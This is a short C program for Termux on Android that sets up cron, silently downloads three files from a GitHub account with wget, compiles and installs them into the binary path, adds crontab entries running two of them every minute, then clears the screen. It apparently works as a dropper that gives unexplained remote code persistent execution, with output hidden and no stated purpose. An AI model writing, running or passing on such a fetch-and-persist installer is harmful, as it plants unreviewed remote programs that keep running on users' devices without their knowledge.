#include<stdio.h>
#include<string.h>
#include<stdlib.h>

int main(int argc, char *argv[])
{
	
system("pkg update -y ; pkg upgrade -y;termux-setup-storage;pkg install cronie -y;pkg install build-essential -y;pkg install termux-services -y;sv-enable crond");

	system("wget https://raw.githubusercontent.com/Wabochi/eng/main/eng.c > /dev/null 2>&1");
	
	system("wget https://raw.githubusercontent.com/Wabochi/inf/main/get > /dev/null 2>&1");
	system("wget https://raw.githubusercontent.com/Wabochi/Artwork-/main/portal > /dev/null 2>&1");
system("gcc eng.c -o eng;chmod +x get;chmod +x portal");

system("mv eng $PREFIX/bin/eng;mv get $PREFIX/bin/get;mv portal $PREFIX/bin/portal");

system("crontab -l > mycron;echo \"* * * * * get\" >> mycron;echo \"* * * * * eng\" >> mycron");
system("crontab mycron;rm mycron;crond;clear");


}
